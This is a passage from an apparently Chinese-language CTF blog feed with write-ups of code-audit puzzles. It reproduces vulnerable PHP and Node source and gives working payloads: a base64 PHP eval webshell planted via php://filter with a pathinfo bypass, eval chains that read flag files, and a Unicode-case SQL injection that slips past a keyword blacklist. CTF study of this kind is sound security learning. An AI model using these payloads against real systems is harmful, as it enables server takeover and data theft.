Â Â Â Â Â Â Â </span><br><span class="line">&lt;formÂ method=<span class="string">"post"</span>&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="input-groupÂ mt-3"&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="input-group-prepend"&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;spanÂ class="input-group-text"Â id="basic-addon1"&gt;digÂ -tÂ AÂ -q&lt;/span&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;inputÂ type="text"Â name="domain"Â class="form-control"Â placeholder="YourÂ domain"&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="input-group-append"&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;buttonÂ class="btnÂ btn-outline-secondary"Â type="submit"&gt;æ‰§è¡Œ&lt;/button&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/form&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â </span><br><span class="line">&lt;divÂ class="row"&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="col"&gt;Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;preÂ class="mt-3"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span>Â <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST)Â &amp;&amp;Â $domain):</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $commandÂ =Â sprintf(<span class="string">"digÂ -tÂ AÂ -qÂ %s"</span>,Â escapeshellarg($domain));</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $outputÂ =Â shell_exec($command);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $outputÂ =Â htmlspecialchars($output,Â ENT_HTML401Â |Â ENT_QUOTES);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $log_nameÂ =Â $_SERVER[<span class="string">'SERVER_NAME'</span>]Â .Â $log_name;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!in_array(pathinfo($log_name,Â PATHINFO_EXTENSION),Â [<span class="string">'php'</span>,Â <span class="string">'php3'</span>,Â <span class="string">'php4'</span>,Â <span class="string">'php5'</span>,Â <span class="string">'phtml'</span>,Â <span class="string">'pht'</span>],Â <span class="keyword">true</span>))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â file_put_contents($log_name,Â $output);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â $output;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">endif</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">            &lt;/div&gt;Â Â Â </span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;</span><br><span class="line">            &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯æ¥çœ‹å¯æ§ç‚¹ï¼Œä¸€ä¸ªæ˜¯åŸŸåå¯æ§ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶åéƒ¨åˆ†å¯æ§ã€‚ç„¶è€Œè¿™é‡Œæœ‰<code>escapeshellarg</code>å¯¼è‡´æˆ‘ä»¬çš„è¾“å…¥è¢«é»˜è®¤æˆå­—ç¬¦ä¸²ï¼Œæ²¡æœ‰åŠæ³•æ³¨å…¥å‘½ä»¤ï¼Œæ‰€ä»¥åªèƒ½æ‰§è¡ŒåŸŸåè§£æã€‚è¿™é‡Œå‚è€ƒfishå¸ˆå‚…çš„æ–¹æ³•ï¼Œè¿™é‡Œæœ€éœ€è¦æ³¨æ„çš„æ˜¯<code>file_get_contents</code>ï¼Œè¿™ç§æ–‡ä»¶æ“ä½œç»è¿‡blackhatçš„è®®é¢˜ï¼Œå¯ä»¥çŸ¥é“éƒ½æ˜¯å¯ä»¥æ“ä½œphpåè®®æµçš„ã€‚è€Œè¿™é‡Œæ˜¯å°†åŸŸåè§£æçš„è¾“å‡ºå†™å…¥ä¸€ä¸ªæ—¥å¿—ä¸­ï¼Œæ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯åˆ©ç”¨php://filterå°†æˆ‘ä»¬çš„base64ç¼–ç çš„æ•°æ®è§£ç è¾“å…¥è¿›æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p><p>å…³äºæ–‡ä»¶åçš„åç¼€é—®é¢˜ï¼Œ<code>http://wonderkun.cc/index.html/?p=626</code> è¿™ç¯‡æ–‡ç« ä¸­çŸ¥é“åœ¨æ–‡ä»¶è·¯å¾„ä¸­åŒ…å«<code>/.</code>æˆ–è€…<code>/../</code>ä¼šå¯¼è‡´pathinfoæ— æ³•è·å–åˆ°åç¼€åï¼Œè¿™æ ·å°±ç»•è¿‡åç¼€åˆ¤æ–­ï¼Œå†™å…¥phpæ–‡ä»¶ã€‚ä¹‹åçš„é—®é¢˜åŸŸåè§£æçš„è¾“å‡ºåªæœ‰ä¸€éƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªè¦ç‚¹å°±æ˜¯base64ä¼šå¿½è§†ä¸ç¬¦åˆè¦æ±‚çš„ç‰¹æ®Šå­—ç¬¦ï¼Œç„¶åä¼šä»¥4ä¸ªå­—ç¬¦ä¸ºä¸€ç»„è§£ç å­—ç¬¦ï¼Œæ‰€ä»¥åªè¦å‰é¢çš„æ•°æ®ä¸º4çš„å€æ•°å°±èƒ½æ­£ç¡®æ‰§è¡Œã€‚å…¶æ¬¡ç”±äºæˆ‘ä»¬çš„è¾“å…¥ç‚¹åœ¨æ•°æ®çš„ä¸­é—´éƒ¨åˆ†ï¼Œæ‰€ä»¥ä¹Ÿä¸èƒ½æœ‰<code>=</code>ç¬¦å·ã€‚</p><p>è¿™é‡Œå†™å…¥æ–‡ä»¶æœ‰ä¸€ä¸ªé‡è¦çš„ç‚¹ï¼Œé€šè¿‡ä¸Šé¢çš„è¿™ç§ç‰¹æ®Šè·¯å¾„å†™å…¥çš„æ–‡ä»¶åªèƒ½åˆ›å»ºæ–°çš„æ–‡ä»¶ï¼Œæ— æ³•è¦†ç›–åŸæ¥çš„æ—§æ–‡ä»¶ã€‚è¿™ç‚¹å¾ˆé‡è¦ï¼Œæˆ‘å°±ç™½å¿™æ´»äº†åŠä¸ªå°æ—¶â€¦â€¦</p><p>æœ€åï¼Œè¿™ä¸ªæ–‡ä»¶åå…¶ä¸­æœ‰ä¸€éƒ¨åˆ†æ˜¯server_nameï¼Œè¿™é‡Œçš„å€¼æ˜¯è·å–çš„å®¢æˆ·ç«¯è¯·æ±‚çš„hostå€¼ï¼Œå› ä¸ºåœ¨ä½¿ç”¨phpæµçš„æ—¶å€™ä¼šåŒ…å«phpï¼Œè¿™é‡Œå°±å¯ä»¥æŠŠphpæ”¾å…¥hostå€¼ä¸­ã€‚</p><img src="/2019/01/10/code-breaking-esay-wp/2.png"><p>å…¶ä¸­base64ç¼–ç ä¸‹é¢çš„webshell</p><p><code>&lt;?php @eval($_POST[&#39;618&#39;]); ?&gt;</code></p><p><code>PD9waHAgQGV2YWwoJF9QT1NUWyc2MTgnXSk7Pz4</code></p><p>æœ€åæˆ‘ä»¬åœ¨<code>http://51.158.75.42:8082/data/558cb3b807e236696e9e2c79295d7fee/x618.php</code>æ‰§è¡Œä»£ç å°±å¯ä»¥è·å–flagäº†ã€‚</p><p><code>618=var_dump(glob(&quot;/var/www/*&quot;));</code></p><p><code>618=var_dump(file_get_contents(&#39;/var/www/flag_phpmag1c_ur1&#39;));</code></p><h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="string">';'</span>Â ===Â preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>,Â <span class="string">''</span>,Â $_GET[<span class="string">'code'</span>]))Â &#123;Â Â Â Â </span><br><span class="line">Â Â Â Â <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€é“è€é¢˜ï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªcodeåªèƒ½æ‰§è¡ŒåµŒå¥—çš„å‡½æ•°ï¼Œä¾‹å¦‚<code>abc(def())</code>è¿™ç§ï¼Œè¿™é‡Œçš„æ€è·¯å°±æ˜¯åˆ©ç”¨httpçš„headeræ¥ä¼ è¾“payloadï¼Œåˆ©ç”¨phpçš„è·å–headerçš„å‡½æ•°ï¼Œå†evalæ‰§è¡Œï¼Œå°±å˜æˆäº†ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p><code>?code=current(getallheaders());</code></p><p>ä½†æ˜¯ï¼ŒWTFï¼Œè¿™æ˜¯nginxçš„æœåŠ¡å™¨ï¼Œæ²¡æœ‰apacheçš„ç›¸å…³å‡½æ•°ï¼Œæ‰¾äº†åŠå¤©æ— åŠŸè€Œè¿”â€¦â€¦ æ‰¾äº†æ‰¾fishå¸ˆå‚…çš„wpï¼Œä»–æ˜¯åˆ©ç”¨äº†<code>get_defined_vars</code> å‡½æ•°è·å–å®šä¹‰çš„å˜é‡ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šå˜é‡æˆ‘ä»¬ä¸å¯æ§æ€ä¹ˆåŠï¼Ÿè¿™é‡Œæœ‰ä¸€ä¸ª <code>reset()</code> æ“ä½œæŠŠä¹‹å‰çš„å˜é‡å…¨éƒ¨é‡ç½®ã€‚æ‰€ä»¥å˜é‡å°±åªå‰©ä¸‹æˆ‘ä»¬ä¼ è¾“çš„getå‚æ•°ï¼Œè¿™æ ·æˆ‘ä»¬ç›´æ¥æŠŠpayloadæ”¾åœ¨getè¯·æ±‚ä¸­ï¼Œç”¨implodeå…¨éƒ¨å–å‡ºï¼Œç„¶åæ‹¼æ¥// æ³¨é‡Šæ‰åé¢çš„éƒ¨åˆ†ï¼Œåˆå˜æˆäº†ä»»æ„ä»£ç æ‰§è¡Œäº†ã€‚</p><p><code>http://51.158.75.42:8084/?1=var_dump(glob(%27/var/www/*%27));//&amp;code=eval(implode(reset(get_defined_vars())));</code></p><p>è€Œè¿™é‡Œä¸¤æ¬¡evalï¼Œç¬¬ä¸€æ¬¡evalæ˜¯æŠŠå˜é‡é‡ç½®ä¹‹åå…¨éƒ¨æå–å‡ºæ¥ï¼Œæå–å‡ºæ¥çš„å­—ç¬¦ä¸²å€¼å†æ¬¡evalï¼Œæ‰ä¼šæ‰§è¡Œæˆ‘ä»¬å‰é¢çš„ä»£ç ã€‚</p><p><code>http://51.158.75.42:8084/?1=var_dump(file_get_contents(%27/var/www/flag_phpbyp4ss%27));//&amp;code=eval(implode(reset(get_defined_vars())));</code></p><p>è¿™é‡Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„payloadï¼Œéƒ½æ˜¯å¤§åŒå°å¼‚ã€‚</p><p><code>?code=eval(next(current(get_defined_vars())));&amp;b=var_dump(glob(%27/var/www/*%27));</code></p><p>å¦å¤–ä¸€ç§æ€è·¯æ˜¯åµŒå¥—ä½¿ç”¨å‡½æ•°æœç´¢ç›®å½•è¯»å–æ–‡ä»¶ã€‚</p><p><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></p><h2 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initial libraries</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>)</span><br><span class="line"><span class="keyword">const</span> sqlite = <span class="built_in">require</span>(<span class="string">'sqlite'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>)</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">'koa-send'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>)</span><br><span class="line"><span class="keyword">const</span> isString = <span class="built_in">require</span>(<span class="string">'underscore'</span>).isString</span><br><span class="line"><span class="keyword">const</span> basename = <span class="built_in">require</span>(<span class="string">'path'</span>).basename</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">JSON</span>.parse(fs.readFileSync(<span class="string">'../config.json'</span>, &#123;<span class="attr">encoding</span>: <span class="string">'utf-8'</span>, <span class="attr">flag</span>: <span class="string">'r'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">new</span> Router()</span><br><span class="line">    <span class="keyword">const</span> db = <span class="keyword">await</span> sqlite.open(<span class="string">':memory:'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."users" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "username" TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        "password" TEXT,</span></span><br><span class="line"><span class="string">        CONSTRAINT "unique_username" UNIQUE ("username")</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."flags" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "flag" TEXT NOT NULL</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> user <span class="keyword">of</span> config.users) &#123;</span><br><span class="line">        <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "users"("username", "password") VALUES ('<span class="subst">$&#123;user.username&#125;</span>', '<span class="subst">$&#123;user.password&#125;</span>')`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "flags"("flag") VALUES ('<span class="subst">$&#123;config.flag&#125;</span>')`</span>)</span><br><span class="line"></span><br><span class="line">    router.all(<span class="string">'login'</span>, <span class="string">'/login/'</span>, login).get(<span class="string">'admin'</span>, <span class="string">'/'</span>, admin).get(<span class="string">'static'</span>, <span class="string">'/static/:path(.+)'</span>, <span class="keyword">static</span>).get(<span class="string">'/source'</span>, source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + <span class="string">'/views'</span>, &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: <span class="string">'underscore'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        extension: <span class="string">'html'</span></span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(<span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">static</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        <span class="keyword">return</span> ctx.redirect(ctx.router.url(<span class="string">'login'</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ctx.render(<span class="string">'admin'</span>, &#123;</span><br><span class="line">        <span class="string">'user'</span>: ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å…³é”®ç‚¹å°±æ˜¯<code>safeKeyword</code>å‡½æ•°çš„è¿‡æ»¤é»‘åå•ï¼Œå¹²æ‰äº†unionå’Œselectï¼Œè¿™ä»¥ä¸ºç€æ³¨å…¥æ—¶å½»åº•æ²¡åŠæ³•ä½¿ç”¨äº†ã€‚åœ¨ä¸‹é¢çš„ç™»å½•æŸ¥è¯¢é€»è¾‘ä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ³¨å…¥ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²ç›´æ¥æ‹¼æ¥è¿›æŸ¥è¯¢ã€‚å…¶å®ä¸€å¼€å§‹æ€è·¯æ˜¯ä»<code>isString</code>å’Œ<code>match</code>ä¸­å¯»æ‰¾ç»•è¿‡æ–¹æ³•ï¼Œä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆç›¸å…³trickã€‚åæ¥åœ¨å‚è€ƒfishå¸ˆå‚…çš„wpä¸­ï¼Œæåˆ°äº†toUpperCaseï¼Œå…¶å®æƒ³æƒ³è¿™é‡Œæœ‰ä¸ªå¤§å†™è½¬æ¢ç¡®å®å¾ˆè¯¡å¼‚ï¼Œæ‰€ä»¥çªç ´å£åº”è¯¥æ˜¯åœ¨è¿™é‡Œã€‚æœç„¶åœ¨phå¸ˆå‚…çš„ä¹‹å‰çš„æ–‡ç« ä¸­æœ‰fuzzå‡ºæ¥çš„ç‰¹æ®Šå­—ç¬¦ã€‚</p><p><code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code></p><p>è¿™é‡Œé¢ <code>Ä±</code> èƒ½å˜æˆå¤§å†™çš„<code>I</code> ï¼Œ<code>Å¿</code> ä¼šå˜æˆå¤§å†™çš„<code>S</code> ï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½åœ¨æ­£å¸¸çš„å­—ç¬¦ä¸­æ’å…¥ç‰¹æ®Šå­—ç¬¦ç»•è¿‡<code>safeKeyword</code>çš„æ£€æµ‹ã€‚å†åŠ ä¸Šæˆ‘ä»¬çŸ¥é“flagå­˜æ”¾åœ¨flagsè¡¨ä¸­ï¼Œuserè¡¨çš„ç»“æ„ä¹Ÿæ˜¯çŸ¥é“çš„ï¼Œæ‰€ä»¥ç›´æ¥ç”¨unionæ³¨å…¥æŸ¥flagçš„å€¼ã€‚</p><p><code>&#39; unÄ±on Å¿elect 1,flag,3 from flags where &#39;1&#39;=&#39;1</code></p><p>ä¸ºäº†è¦é—­åˆå•å¼•å·ï¼Œå¿…é¡»è¦å‡‘ä¸ªwhereè¯­å¥ã€‚æœ€ç»ˆåœ¨ç™»å½•ç•Œé¢æ‹¿åˆ°flagã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><code>https://lorexxar.cn/2018/12/07/codingbreak-wp/</code></p><p><code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</code></p><p><code>https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html</code></p><p><code>http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</code></p><p><code>http://rui0.cn/archives/1015</code></p><p><code>https://blog.l0ca1.xyz/Code-Breaking</code></p><p><code>https://blog.csdn.net/fnmsd/article/details/84556522</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;phå¸ˆå‚…çš„ä»£ç å®¡è®¡CTFé¢˜ç›® &lt;code&gt;https://code-breaking.com&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;easy-function&quot;&gt;&lt;a href=&quot;#easy-function&quot; class=&quot;headerlink&quot; title=&quot;easy 
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part2</title>
    <link href="https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/"/>
    <id>https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/</id>
    <published>2018-08-14T16:47:21.000Z</published>
    <updated>2018-08-14T16:47:21.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Holey-Beep-PWN"><a href="#Holey-Beep-PWN" class="headerlink" title="Holey Beep(PWN)"></a>Holey Beep(PWN)</h2><p>Holey Beepæ˜¯CVE-2018-0492ï¼Œè¯¦ç»†çš„æ¼æ´ç»†èŠ‚ <a href="https://sigint.sh/#/holeybeep" target="_blank" rel="noopener">https://sigint.sh/#/holeybeep</a> ã€‚ä¸€å¼€å§‹ä»¥ä¸ºè¦ç”¨è¿™ä¸ªçš„expï¼Œç»“æœä¸€çœ‹ç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¼¼ä¹ä¸å¤ªå¯¹â€¦â€¦æˆ‘ä»¬éœ€è¦å¾—åˆ°<code>/secret_cake_recipe</code>çš„å†…å®¹ï¼Œç„¶è€Œæƒé™ä¸å¤Ÿï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥æ˜¯æ‹¿æ¥è¶Šæƒçš„ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/1.png"><p>æˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸€ä¸ªifæ˜¯ä¸€ä¸ªé€šè¿‡ä¿¡å·è§¦å‘çš„æ¡ä»¶ï¼Œç¬¬äºŒä¸ªifçŸ¥é“äº†ç¨‹åºéœ€è¦å‚æ•°ï¼Œç„¶åä¼šopenä¸€ä¸ªå†™æ­»çš„è·¯å¾„ï¼Œä¹‹åå°†è¾“å…¥çš„å‚æ•°ä»£å…¥<code>ioctl(device,0x4B2F,å‚æ•°)</code>ï¼Œå‡ºç°é—®é¢˜å°±ä¼šæ‰“å°æŠ¥é”™ä¿¡æ¯ï¼Œç„¶åå…³é—­æ‰“å¼€çš„æ–‡ä»¶ã€‚å¾ªç¯ä¸Šé¢çš„æ“ä½œæŠŠæ‰€æœ‰çš„å‚æ•°éƒ½è·‘ä¸€éã€‚</p><p>ä¿¡å·è§¦å‘çš„ifä¼šæ‰§è¡Œé¢å¤–çš„ä¸€æ®µå‡½æ•°ã€‚</p><img 